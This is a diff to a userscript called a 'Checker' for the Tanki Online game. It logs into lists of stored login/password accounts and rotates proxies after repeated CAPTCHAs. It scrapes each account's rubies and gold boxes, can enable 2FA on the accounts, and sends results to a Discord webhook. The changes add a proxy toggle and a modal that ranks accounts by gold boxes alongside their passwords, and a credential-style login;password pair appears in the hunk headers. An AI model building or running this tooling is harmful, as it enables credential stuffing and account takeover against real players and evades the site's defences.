@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Tanki Online — Checker prod. by yuuairline
 // @namespace    http://tampermonkey.net/
-// @version      1.0.1
+// @version      1.0.2
 // @description  Checker + auto 2FA enable
 // @author       yuuairline
 // @match        https://*.tankionline.com/play/
@@ -58,6 +58,7 @@
         PROXY_ROTATION_BATCH_SIZE: 10,
         PROXY_ROTATION_CHANNEL: "PROXY_ROTATION_BRIDGE_V1",
         PROXY_ROTATION_TEST_TIMEOUT: 10000,
+        PROXY_ENABLED: true,
         AUTO_ENABLE_2FA: false,
         TWOFA_ACCOUNTS_KEY: "tanki_2fa_accounts_v1"
     };
@@ -121,6 +122,7 @@
             RUBIES_AUTO_TIME: CONFIG.RUBIES_AUTO_TIME,
             RUBIES_AUTO_ADD_BONUS: CONFIG.RUBIES_AUTO_ADD_BONUS,
             RUBIES_SKIP_FINISHED: CONFIG.RUBIES_SKIP_FINISHED,
+            PROXY_ENABLED: CONFIG.PROXY_ENABLED,
             AUTO_ENABLE_2FA: CONFIG.AUTO_ENABLE_2FA
         }));
         GM_setValue(CONFIG.MODE_KEY, MODE);
@@ -387,7 +389,9 @@
             experience: payload.experience ?? null,
             rubies: payload.rubies || "0",
             crystals: payload.crystals || "0",
-            goldBoxes: payload.goldBoxes || "0",
+            goldBoxes: (payload.goldBoxes !== undefined && payload.goldBoxes !== null && payload.goldBoxes !== "")
+                ? String(payload.goldBoxes)
+                : null,
             tankoins: payload.tankoins || "0",
             year: payload.year ?? null,
             bound: payload.bound ?? null,
@@ -446,7 +450,7 @@
                 "Опыт - " + (r.experience != null ? r.experience : "—"),
                 "Рубины - " + formatAmount(r.rubies),
                 "Кристаллы - " + formatAmount(r.crystals),
-                "Золотые ящики - " + formatAmount(r.goldBoxes),
+                "Золотые ящики - " + (r.goldBoxes !== null && r.goldBoxes !== undefined && r.goldBoxes !== "" ? formatAmount(r.goldBoxes) : "—"),
                 "Танкоины - " + formatAmount(r.tankoins),
                 "Год - " + (r.year || "—"),
                 "Привязан - " + (r.bound === true ? "да" : r.bound === false ? "нет" : "—"),
@@ -1235,6 +1239,12 @@
                 return;
             }
 
+            if (!CONFIG.PROXY_ENABLED) {
+                this.log("PROXY_ENABLED=false — init без активации прокси");
+                this.emit();
+                return;
+            }
+
             if (!this.proxyList.length) {
                 this.handleError(new Error("Список прокси пуст"), false);
                 this.emit();
@@ -1247,7 +1257,15 @@
         }
 
         async beginAccountCheck(login) {
-            if (this.destroyed || !login || !this.proxyList.length) return false;
+            if (this.destroyed || !login) return false;
+            if (!CONFIG.PROXY_ENABLED) {
+                this.log("PROXY_ENABLED=false — пропуск ротации прокси");
+                this.activeAccountLogin = String(login).trim() || null;
+                this.saveState();
+                this.emit();
+                return true;
+            }
+            if (!this.proxyList.length) return false;
             const normalizedLogin = String(login).trim();
             if (!normalizedLogin) return false;
 
@@ -1285,6 +1303,10 @@
         }
 
         async switchNextProxy(reason = "MANUAL_SWITCH") {
+            if (!CONFIG.PROXY_ENABLED) {
+                this.log("PROXY_ENABLED=false — switchNextProxy пропущен (" + reason + ")");
+                return true;
+            }
             if (!this.proxyList.length) {
                 this.handleError(new Error("Список прокси пуст"), false);
                 return false;
@@ -1319,6 +1341,10 @@
         }
 
         async ensureProxy(index, reason = "ACCOUNT_START") {
+            if (!CONFIG.PROXY_ENABLED) {
+                this.log("PROXY_ENABLED=false — ensureProxy пропущен (" + reason + ")");
+                return true;
+            }
             if (!this.proxyList.length) return false;
             if (index < 0 || index >= this.proxyList.length) return false;
 
@@ -1376,6 +1402,10 @@
 
         async setProxy(index, reason = "ACCOUNT_START") {
             if (this.destroyed) return false;
+            if (!CONFIG.PROXY_ENABLED) {
+                this.log("PROXY_ENABLED=false — setProxy пропущен (" + reason + ")");
+                return true;
+            }
             if (!Number.isInteger(index) || index < 0 || index >= this.proxyList.length) {
                 this.error("Invalid proxy index:", index);
                 return false;
@@ -2034,8 +2064,11 @@
         else advanceCheckQueue();
 
         let switched = false;
-        if (proxyRotationManager) {
+        if (CONFIG.PROXY_ENABLED && proxyRotationManager) {
             switched = await proxyRotationManager.switchNextProxy("CAPTCHA_3_CONSECUTIVE");
+        } else if (!CONFIG.PROXY_ENABLED) {
+            switched = true;
+            console.warn(`[${timestamp}] CAPTCHA 3/3 — PROXY_ENABLED=false, переключение прокси пропущено`);
         }
 
         resetCaptchaCount("3 CAPTCHA подряд — proxy переключён");
@@ -2046,8 +2079,12 @@
             return { login, status: "captcha_proxy_switch_failed" };
         }
 
-        showToast("3 CAPTCHA подряд — переключён proxy, продолжаем", "warning");
-        sendDiscordMessage("🔄 CAPTCHA появилась 3 раза подряд — proxy автоматически переключён, проверка продолжается.");
+        if (CONFIG.PROXY_ENABLED) {
+            showToast("3 CAPTCHA подряд — переключён proxy, продолжаем", "warning");
+            sendDiscordMessage("🔄 CAPTCHA появилась 3 раза подряд — proxy автоматически переключён, проверка продолжается.");
+        } else {
+            showToast("3 CAPTCHA подряд — прокси выключены, продолжаем", "warning");
+        }
 
         const nextAcc = shuffledAccounts[currentIndex];
         console.log(`[captcha] 3/3: ${login} пропущен → следующий аккаунт: ${nextAcc?.login || "нет"}`);
@@ -3092,19 +3129,45 @@ async function testDiscordNotification() {
     // =========================================================
     // CHECKER FLOW
     // =========================================================
-    async function getGoldBoxes() {
-        const cells = document.querySelectorAll(".SuppliesComponentStyle-cellAdd, [class*='SuppliesComponentStyle-cell']");
+    function readGoldBoxesFromDom() {
+        // Только стабильные признаки: cellAdd + img GoldBox*.svg; число в span того же контейнера.
+        // Не используем динамические классы вида ksc-203.
+        const cells = document.querySelectorAll(".SuppliesComponentStyle-cellAdd, [class*='SuppliesComponentStyle-cellAdd']");
         for (const cell of cells) {
-            const img = cell.querySelector('img[src*="GoldBox"]');
-            if (img) { const s = cell.querySelector("span"); if (s) return parseNumberFromText(s.textContent); }
-        }
-        for (const el of document.querySelectorAll("div, span")) {
-            if (el.querySelector && el.querySelector('img[src*="GoldBox"]')) {
-                const s = el.querySelector("span");
-                if (s) return parseNumberFromText(s.textContent);
+            if (!cell || !cell.isConnected) continue;
+            const img = cell.querySelector('img[src*="GoldBox"][src$=".svg"], img[src*="GoldBox"]');
+            if (!img) continue;
+            const src = String(img.getAttribute("src") || "");
+            if (!/GoldBox/i.test(src) || !/\.svg(\?|$)/i.test(src)) continue;
+            // span — прямой/ближайший потомок cellAdd (рядом с .SuppliesComponentStyle-cell)
+            let span = null;
+            for (const child of cell.children) {
+                if (child.tagName === "SPAN") { span = child; break; }
             }
+            if (!span) span = cell.querySelector(":scope > span");
+            if (!span) {
+                // fallback: span рядом с img-контейнером, но всё ещё внутри cellAdd
+                span = cell.querySelector("span");
+            }
+            if (!span) continue;
+            const raw = (span.textContent || "").replace(/\s+/g, " ").trim();
+            if (!/^\d+$/.test(raw.replace(/[\s\u00A0\u202F\u2009]/g, ""))) continue;
+            return parseNumberFromText(raw);
         }
-        return "0";
+        return null;
+    }
+
+    async function getGoldBoxes(timeoutMs = 6000) {
+        const started = Date.now();
+        let value = readGoldBoxesFromDom();
+        if (value !== null) return value;
+        while (Date.now() - started < timeoutMs) {
+            await sleep(250);
+            value = readGoldBoxesFromDom();
+            if (value !== null) return value;
+        }
+        // Элемент не появился — неизвестно, НЕ подменяем на "0"
+        return null;
     }
     async function getTankoins() {
         const blocks = document.querySelectorAll(".HeaderCommonStyle-icons, [class*='HeaderCommonStyle-icons']");
@@ -4302,15 +4365,19 @@ async function testDiscordNotification() {
         email = normalizeEmail(email);
         if (!isRunning) return { login, status: "stopped" };
 
-        if (proxyRotationManager) {
-            const proxyReady = await proxyRotationManager.beginAccountCheck(login);
-            if (!proxyReady) {
-                console.error(`[PROXY] FastValid: proxy is not ready for ${login}; account check is paused`);
-                return { login, status: "proxy_not_ready" };
+        if (CONFIG.PROXY_ENABLED) {
+            if (proxyRotationManager) {
+                const proxyReady = await proxyRotationManager.beginAccountCheck(login);
+                if (!proxyReady) {
+                    console.error(`[PROXY] FastValid: proxy is not ready for ${login}; account check is paused`);
+                    return { login, status: "proxy_not_ready" };
+                }
+            } else {
+                console.error("[PROXY] FastValid: ProxyRotationManager is not initialized");
+                return { login, status: "proxy_not_initialized" };
             }
-        } else {
-            console.error("[PROXY] FastValid: ProxyRotationManager is not initialized");
-            return { login, status: "proxy_not_initialized" };
+        } else if (proxyRotationManager) {
+            await proxyRotationManager.beginAccountCheck(login);
         }
 
         const log = (msg) => console.log(`[FastValid] ${msg}`);
@@ -6151,17 +6218,21 @@ async function testDiscordNotification() {
     // UI — DESIGN SYSTEM
     // =========================================================
     function injectStyles() {
-        try { document.getElementById("tchecker-premium-v72")?.remove(); } catch (_) {}
-        try { document.getElementById("tchecker-styles")?.remove(); } catch (_) {}
-        const style = document.createElement("style");
-        style.id = "tchecker-styles";
-        style.textContent = `
+    try { document.getElementById("tchecker-premium-v72")?.remove(); } catch (_) {}
+    try { document.getElementById("tchecker-styles")?.remove(); } catch (_) {}
+    const style = document.createElement("style");
+    style.id = "tchecker-styles";
+    style.textContent = `
 /* ===== RESET / BASE ===== */
 #tc-menu.tchecker-ui,
 #tc-menu.tchecker-ui *,
 #tc-overlay.tchecker-ui,
 #tc-detail-modal.tchecker-ui,
 #tc-detail-modal.tchecker-ui *,
+#tc-assets-modal.tchecker-ui,
+#tc-assets-modal.tchecker-ui *,
+#tc-gold-modal.tchecker-ui,
+#tc-gold-modal.tchecker-ui *,
 #tc-rubies-add-modal.tchecker-ui,
 #tc-rubies-add-modal.tchecker-ui *,
 .tc-toast-stack.tchecker-ui,
@@ -6170,6 +6241,8 @@ async function testDiscordNotification() {
 }
 #tc-menu.tchecker-ui,
 #tc-detail-modal.tchecker-ui,
+#tc-assets-modal.tchecker-ui,
+#tc-gold-modal.tchecker-ui,
 #tc-rubies-add-modal.tchecker-ui,
 .tc-toast-stack.tchecker-ui{
   font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
@@ -6177,13 +6250,16 @@ async function testDiscordNotification() {
   color:var(--tc-text);
 }
 #tc-menu.tchecker-ui svg,
-#tc-detail-modal.tchecker-ui svg{width:16px;height:16px;flex-shrink:0;display:block}
+#tc-detail-modal.tchecker-ui svg,
+#tc-assets-modal.tchecker-ui svg,
+#tc-gold-modal.tchecker-ui svg{width:16px;height:16px;flex-shrink:0;display:block}
 
 /* ===== THEMES ===== */
 #tc-menu.tchecker-ui[data-theme="dark"],
 #tc-detail-modal.tchecker-ui[data-theme="dark"],
 #tc-rubies-add-modal.tchecker-ui[data-theme="dark"],
 #tc-assets-modal.tchecker-ui[data-theme="dark"],
+#tc-gold-modal.tchecker-ui[data-theme="dark"],
 .tc-toast-stack.tchecker-ui[data-theme="dark"]{
   --tc-bg:#0b0b0d;
   --tc-bg-2:#111114;
@@ -6215,6 +6291,7 @@ async function testDiscordNotification() {
 #tc-detail-modal.tchecker-ui[data-theme="light"],
 #tc-rubies-add-modal.tchecker-ui[data-theme="light"],
 #tc-assets-modal.tchecker-ui[data-theme="light"],
+#tc-gold-modal.tchecker-ui[data-theme="light"],
 .tc-toast-stack.tchecker-ui[data-theme="light"]{
   --tc-bg:#f6f4ef;
   --tc-bg-2:#efece4;
@@ -6610,26 +6687,31 @@ async function testDiscordNotification() {
 #tc-menu .tc-select-panel.show{display:block}
 #tc-menu .tc-select-item{display:flex;align-items:center;gap:8px;padding:6px 8px;font-size:12px;color:var(--tc-text) !important;cursor:pointer}
 
-/* ===== DETAIL + ASSETS MODALS ===== */
+/* ===== DETAIL + ASSETS + GOLD MODALS ===== */
 #tc-detail-modal,
-#tc-assets-modal{
+#tc-assets-modal,
+#tc-gold-modal{
   position:fixed;inset:0;z-index:100001;display:none;align-items:center;justify-content:center;
   background:rgba(0,0,0,.7);backdrop-filter:blur(10px);
   color:var(--tc-text) !important;
 }
 #tc-detail-modal.show{display:flex}
 #tc-detail-modal .tc-detail-content,
-#tc-assets-modal .tc-detail-content{
+#tc-assets-modal .tc-detail-content,
+#tc-gold-modal .tc-detail-content{
   width:min(560px,calc(100vw - 32px));max-height:min(80vh,720px);overflow:auto;
   background:var(--tc-bg-2) !important;border:1px solid var(--tc-border);border-radius:18px;
   padding:18px 18px 16px;color:var(--tc-text) !important;box-shadow:var(--tc-shadow);
 }
 #tc-detail-modal .tc-detail-header,
-#tc-assets-modal .tc-detail-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;gap:12px}
+#tc-assets-modal .tc-detail-header,
+#tc-gold-modal .tc-detail-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;gap:12px}
 #tc-detail-modal .tc-detail-title,
-#tc-assets-modal .tc-detail-title{font-size:16px;font-weight:800;color:var(--tc-text) !important}
+#tc-assets-modal .tc-detail-title,
+#tc-gold-modal .tc-detail-title{font-size:16px;font-weight:800;color:var(--tc-text) !important}
 #tc-detail-modal .tc-detail-close,
-#tc-assets-modal .tc-detail-close{
+#tc-assets-modal .tc-detail-close,
+#tc-gold-modal .tc-detail-close{
   width:32px;height:32px;border-radius:9px;border:1px solid var(--tc-border);
   background:var(--tc-surface) !important;color:var(--tc-text-muted) !important;cursor:pointer;
   font-size:14px;line-height:1;
@@ -6642,8 +6724,9 @@ async function testDiscordNotification() {
 #tc-detail-modal .tc-detail-value{color:var(--tc-text) !important;font-weight:600;text-align:right;word-break:break-all}
 #tc-detail-modal .tc-detail-actions{display:flex;gap:8px;margin-top:14px}
 
-/* Shared cards outside #tc-menu (assets modal list) */
+/* Shared cards outside #tc-menu (assets / gold modal lists) */
 #tc-assets-modal .tc-account-card,
+#tc-gold-modal .tc-account-card,
 #tc-detail-modal .tc-account-card{
   display:flex;align-items:center;justify-content:space-between;gap:12px;
   padding:12px 14px;margin-bottom:8px;
@@ -6655,18 +6738,22 @@ async function testDiscordNotification() {
   transition:border-color .15s ease,background .15s ease;
 }
 #tc-assets-modal .tc-account-card:hover,
+#tc-gold-modal .tc-account-card:hover,
 #tc-detail-modal .tc-account-card:hover{
   border-color:var(--tc-border-2);background:var(--tc-surface-2) !important;
 }
 #tc-assets-modal .tc-account-card .login,
+#tc-gold-modal .tc-account-card .login,
 #tc-detail-modal .tc-account-card .login{
   font-size:13px;font-weight:700;color:var(--tc-text) !important;
 }
 #tc-assets-modal .tc-account-card .details,
+#tc-gold-modal .tc-account-card .details,
 #tc-detail-modal .tc-account-card .details{
   display:flex;flex-wrap:wrap;gap:6px;margin-top:4px;
 }
 #tc-assets-modal .tag,
+#tc-gold-modal .tag,
 #tc-detail-modal .tag{
   display:inline-flex;align-items:center;
   padding:2px 8px;border-radius:999px;
@@ -6676,16 +6763,20 @@ async function testDiscordNotification() {
   color:var(--tc-text-muted) !important;
 }
 #tc-assets-modal .tc-empty,
+#tc-gold-modal .tc-empty,
 #tc-detail-modal .tc-empty{
   padding:28px 20px;text-align:center;
   border:1px dashed var(--tc-border-2);border-radius:14px;
   color:var(--tc-text-muted) !important;
 }
 #tc-assets-modal .tc-empty h4,
+#tc-gold-modal .tc-empty h4,
 #tc-detail-modal .tc-empty h4{margin:0 0 6px;color:var(--tc-text) !important;font-size:14px}
 #tc-assets-modal .tc-empty p,
+#tc-gold-modal .tc-empty p,
 #tc-detail-modal .tc-empty p{margin:0;font-size:12px;color:var(--tc-text-dim) !important}
-#tc-assets-modal #assets-modal-list{overflow-y:auto;flex:1;padding:4px 0;min-height:120px}
+#tc-assets-modal #assets-modal-list,
+#tc-gold-modal #gold-modal-list{overflow-y:auto;flex:1;padding:4px 0;min-height:120px}
 
 /* ===== RUBIES ADD MODAL ===== */
 #tc-rubies-add-modal{
@@ -7094,6 +7185,43 @@ ivan13000;d1f2y3z4
         return list;
     }
 
+    function parseGoldBoxesValue(v) {
+        if (v === null || v === undefined || v === "" || v === "—") return null;
+        const n = parseInt(String(v).replace(/\s/g, ""), 10);
+        return Number.isFinite(n) && n >= 0 ? n : null;
+    }
+
+    function getAccountsWithGoldBoxes() {
+        const list = [];
+        for (const acc of ACCOUNTS) {
+            const st = getAccountStatus(acc.login) || {};
+            const gold = parseGoldBoxesValue(st.goldBoxes);
+            if (gold === null || gold <= 0) continue;
+            list.push({
+                login: acc.login,
+                password: acc.password,
+                email: acc.email,
+                username: st.username || acc.login,
+                rank: st.rank || acc.rankFromBase || "—",
+                goldBoxes: gold,
+                rubies: st.rubies || "0",
+                tankoins: st.tankoins || "0"
+            });
+        }
+        list.sort((a, b) => b.goldBoxes - a.goldBoxes);
+        return list;
+    }
+
+    function getTotalGoldBoxes() {
+        let total = 0;
+        for (const acc of ACCOUNTS) {
+            const st = getAccountStatus(acc.login) || {};
+            const gold = parseGoldBoxesValue(st.goldBoxes);
+            if (gold) total += gold;
+        }
+        return total;
+    }
+
     function openAssetsModal() {
         let modal = document.getElementById("tc-assets-modal");
         if (!modal) {
@@ -7151,6 +7279,63 @@ ivan13000;d1f2y3z4
         setTimeout(() => { modal.style.display = "none"; }, 200);
     }
 
+    function openGoldBoxesModal() {
+        let modal = document.getElementById("tc-gold-modal");
+        if (!modal) {
+            modal = document.createElement("div");
+            modal.id = "tc-gold-modal";
+            modal.className = "tchecker-ui";
+            modal.setAttribute("data-theme", CONFIG.THEME || "dark");
+            modal.innerHTML = `
+                <div class="tc-detail-content" style="max-width:560px;max-height:80vh;display:flex;flex-direction:column">
+                    <div class="tc-detail-header">
+                        <div class="tc-detail-title">Аккаунты с золотыми ящиками</div>
+                        <button class="tc-detail-close" id="gold-modal-close">✕</button>
+                    </div>
+                    <div id="gold-modal-list" style="overflow-y:auto;flex:1;padding:4px 0"></div>
+                </div>`;
+            document.body.appendChild(modal);
+            modal.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(10px);z-index:100001;display:none;align-items:center;justify-content:center;opacity:0;transition:opacity .2s";
+            modal.addEventListener("click", e => { if (e.target === modal) closeGoldBoxesModal(); });
+            modal.querySelector("#gold-modal-close").addEventListener("click", closeGoldBoxesModal);
+        }
+        modal.setAttribute("data-theme", CONFIG.THEME || "dark");
+        const list = getAccountsWithGoldBoxes();
+        const box = modal.querySelector("#gold-modal-list");
+        if (!list.length) {
+            box.innerHTML = `<div class="tc-empty"><h4>Нет аккаунтов</h4><p>Нет валидных аккаунтов с золотыми ящиками (или значение ещё не считано).</p></div>`;
+        } else {
+            box.innerHTML = list.map(a => `
+                <div class="tc-account-card" data-login="${escapeHtml(a.login)}" style="cursor:pointer;margin-bottom:8px">
+                    <div>
+                        <div class="login">${escapeHtml(a.username || a.login)}</div>
+                        <div class="details">
+                            <span class="tag">${escapeHtml(a.login)}</span>
+                            <span class="tag">${escapeHtml(a.rank)}</span>
+                            <span class="tag">📦 ${formatAmount(String(a.goldBoxes))}</span>
+                            <span class="tag">◆ ${formatAmount(String(a.rubies))}</span>
+                        </div>
+                    </div>
+                </div>`).join("");
+            box.querySelectorAll(".tc-account-card").forEach(card => {
+                card.addEventListener("click", () => {
+                    selectedAccountLogin = card.dataset.login;
+                    closeGoldBoxesModal();
+                    if (selectedAccountLogin) openDetailModal(selectedAccountLogin);
+                });
+            });
+        }
+        modal.style.display = "flex";
+        requestAnimationFrame(() => { modal.style.opacity = "1"; });
+    }
+
+    function closeGoldBoxesModal() {
+        const modal = document.getElementById("tc-gold-modal");
+        if (!modal) return;
+        modal.style.opacity = "0";
+        setTimeout(() => { modal.style.display = "none"; }, 200);
+    }
+
     // =========================================================
     // RENDER — DASHBOARD
     // =========================================================
@@ -7178,6 +7363,8 @@ ivan13000;d1f2y3z4
         }).length;
         const queueStats = getCheckQueueStats();
         const assetsCount = getAccountsWithAssets().length;
+        const goldTotal = getTotalGoldBoxes();
+        const goldAccounts = getAccountsWithGoldBoxes().length;
 
         el.innerHTML = `
             <div class="tc-section-title">Overview</div>
@@ -7199,6 +7386,12 @@ ivan13000;d1f2y3z4
                     <div class="tc-stat-value">${formatAmount(String(rubiesTotal))}</div>
                     <div class="tc-stat-label">Total rubies</div>
                     <div class="tc-stat-sub">Нажми · ${assetsCount} акк. с активами</div>
+                </div>
+                <div class="tc-stat" id="tc-stat-gold-total" style="cursor:pointer" title="Показать аккаунты с золотыми ящиками">
+                    <div class="tc-stat-icon">${ICONS.stats}</div>
+                    <div class="tc-stat-value">${formatAmount(String(goldTotal))}</div>
+                    <div class="tc-stat-label">Total gold boxes</div>
+                    <div class="tc-stat-sub">Нажми · ${goldAccounts} акк. с голдами</div>
                 </div>
                 <div class="tc-stat">
                     <div class="tc-stat-icon">${ICONS.stats}</div>
@@ -7232,6 +7425,10 @@ ivan13000;d1f2y3z4
         const rubiesStat = document.getElementById("tc-stat-rubies-total");
         if (rubiesStat) {
             rubiesStat.addEventListener("click", () => openAssetsModal());
+        }
+        const goldStat = document.getElementById("tc-stat-gold-total");
+        if (goldStat) {
+            goldStat.addEventListener("click", () => openGoldBoxesModal());
         }
 
         const rubiesContainer = document.getElementById("tc-dashboard-rubies");
@@ -8570,6 +8767,15 @@ ivan13000;d1f2y3z4
             </div>
             <div class="tc-section-title" style="margin-top:18px">IP proxy</div>
             <label class="tc-switch" style="margin-bottom:12px">
+                <span>Использовать прокси</span>
+                <input type="checkbox" id="set-proxy-enabled">
+                <span class="tc-switch-track"></span>
+            </label>
+            <div style="font-size:11px;color:var(--tc-text-dim);margin:-4px 0 12px;line-height:1.45">
+                Выключено: скрипт не переключает и не подключает прокси (в т.ч. по batch и CAPTCHA).
+                IP_CHECK_ENABLED ниже отвечает только за определение внешнего IP, не за ротацию.
+            </div>
+            <label class="tc-switch" style="margin-bottom:12px">
                 <span>Detect proxy IP and send to Discord</span>
                 <input type="checkbox" id="set-ipcheck">
                 <span class="tc-switch-track"></span>
@@ -8625,6 +8831,7 @@ ivan13000;d1f2y3z4
         document.getElementById("set-webhook").value = CONFIG.DISCORD_WEBHOOK || "";
         document.getElementById("set-interval").value = CONFIG.CHECK_INTERVAL;
         document.getElementById("set-menukey").value = (CONFIG.MENU_KEY || "f8").toUpperCase();
+        document.getElementById("set-proxy-enabled").checked = CONFIG.PROXY_ENABLED !== false;
         document.getElementById("set-ipcheck").checked = !!CONFIG.IP_CHECK_ENABLED;
         document.getElementById("set-rubies-discord").checked = !!CONFIG.DISCORD_RUBIES_NOTIFICATIONS;
         document.getElementById("set-auto-2fa").checked = !!CONFIG.AUTO_ENABLE_2FA;
@@ -8653,10 +8860,32 @@ ivan13000;d1f2y3z4
             CONFIG.DISCORD_WEBHOOK = normalizeDiscordWebhook(document.getElementById("set-webhook").value) || "";
             CONFIG.CHECK_INTERVAL = parseInt(document.getElementById("set-interval").value) || 800;
             CONFIG.MENU_KEY = (document.getElementById("set-menukey").value || "f8").toLowerCase();
+            const prevProxyEnabled = CONFIG.PROXY_ENABLED !== false;
+            CONFIG.PROXY_ENABLED = document.getElementById("set-proxy-enabled").checked;
             CONFIG.IP_CHECK_ENABLED = document.getElementById("set-ipcheck").checked;
             CONFIG.DISCORD_RUBIES_NOTIFICATIONS = document.getElementById("set-rubies-discord").checked;
             CONFIG.AUTO_ENABLE_2FA = document.getElementById("set-auto-2fa").checked;
             saveConfig();
+            if (prevProxyEnabled && !CONFIG.PROXY_ENABLED) {
+                // Пытаемся снять прокси через clearProxy расширения (если bridge поддерживает).
+                (async () => {
+                    try {
+                        if (proxyExtensionBridge && proxyExtensionBridge.connected) {
+                            const result = await proxyExtensionBridge.clearProxy();
+                            console.log("[PROXY] clearProxy after disable:", result);
+                            showToast("Прокси выключены в скрипте; clearProxy отправлен в extension", "info");
+                        } else {
+                            showToast("Прокси выключены в скрипте. Extension bridge недоступен — clearProxy не подтверждён", "warning");
+                        }
+                    } catch (err) {
+                        console.warn("[PROXY] clearProxy failed:", err);
+                        showToast("Прокси выключены в скрипте, но clearProxy не подтверждён extension", "warning");
+                    }
+                    proxyRotationManager?.emit();
+                })();
+            } else if (!prevProxyEnabled && CONFIG.PROXY_ENABLED && proxyRotationManager) {
+                proxyRotationManager.init().catch(e => proxyRotationManager.handleError(e, false));
+            }
             showToast("Saved", "success");
         });
         document.getElementById("btn-test-discord").addEventListener("click", async () => {
@@ -8891,7 +9120,9 @@ ivan13000;d1f2y3z4
             if (st.rubies) lines.push(`Рубины - ${formatAmount(st.rubies)}`);
             if (st.crystals) lines.push(`Кристаллы - ${formatAmount(st.crystals)}`);
             if (st.tankoins) lines.push(`Танкоины - ${formatAmount(st.tankoins)}`);
-            if (st.goldBoxes) lines.push(`Золотые ящики - ${formatAmount(st.goldBoxes)}`);
+            if (st.goldBoxes !== null && st.goldBoxes !== undefined && st.goldBoxes !== "") {
+                lines.push(`Золотые ящики - ${formatAmount(st.goldBoxes)}`);
+            }
             if (st.experience != null) lines.push(`Опыт - ${st.experience}`);
             if (acc.bound !== null && acc.bound !== undefined) lines.push(`Привязан - ${acc.bound ? "да" : "нет"}`);
             if (st.bonusReceived) lines.push(`Компенсация - да`);
@@ -9065,16 +9296,20 @@ ivan13000;d1f2y3z4
             }
 
             if (MODE === "checker" || MODE === "fastValid") {
-                if (!proxyRotationManager) {
-                    console.error("[PROXY] Менеджер ротации не инициализирован — аккаунт не запускается");
-                    await sleep(1000);
-                    continue;
-                }
-                const proxyReady = await proxyRotationManager.beginAccountCheck(acc.login);
-                if (!proxyReady) {
-                    console.error(`[PROXY] Не удалось активировать прокси для аккаунта ${acc.login} — аккаунт НЕ запускается`);
-                    await sleep(1500);
-                    continue;
+                if (CONFIG.PROXY_ENABLED) {
+                    if (!proxyRotationManager) {
+                        console.error("[PROXY] Менеджер ротации не инициализирован — аккаунт не запускается");
+                        await sleep(1000);
+                        continue;
+                    }
+                    const proxyReady = await proxyRotationManager.beginAccountCheck(acc.login);
+                    if (!proxyReady) {
+                        console.error(`[PROXY] Не удалось активировать прокси для аккаунта ${acc.login} — аккаунт НЕ запускается`);
+                        await sleep(1500);
+                        continue;
+                    }
+                } else if (proxyRotationManager) {
+                    await proxyRotationManager.beginAccountCheck(acc.login);
                 }
                 if (MODE === "checker") {
                     await checkAccount(acc.login, acc.password, acc.email);
